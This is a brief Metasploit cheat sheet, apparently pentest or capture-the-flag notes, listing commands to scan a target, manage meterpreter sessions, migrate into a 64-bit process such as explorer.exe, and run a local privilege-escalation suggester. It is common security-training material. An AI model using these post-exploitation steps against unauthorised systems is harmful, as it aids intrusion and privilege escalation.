#### Metasploit

```
# Start Metasploit
msfdb run

# Interact with workspaces
workspace

# For help
workspace -h

# Scan target with nmap
db_nmap -A <target ip>

```
#### Access a backgrounded meterpreter session
```
sessions -i <number>
```

#### Check Architecture and Meterpreter Version
```
sysinfo
```

#### Migrate from 32-bit to 64-bit Meterpreter session
```
# From your meterpreter session
ps

# Migrate into an X64 process such as explorer.exe
migrate <PID #>
```

#### Privesc with a Meterpreter session
```
# Background your low-priv meterpreter session
background

# local_exploit_suggester
use multi/recon/local_exploit_suggester

# show options
set session #
exploit
```
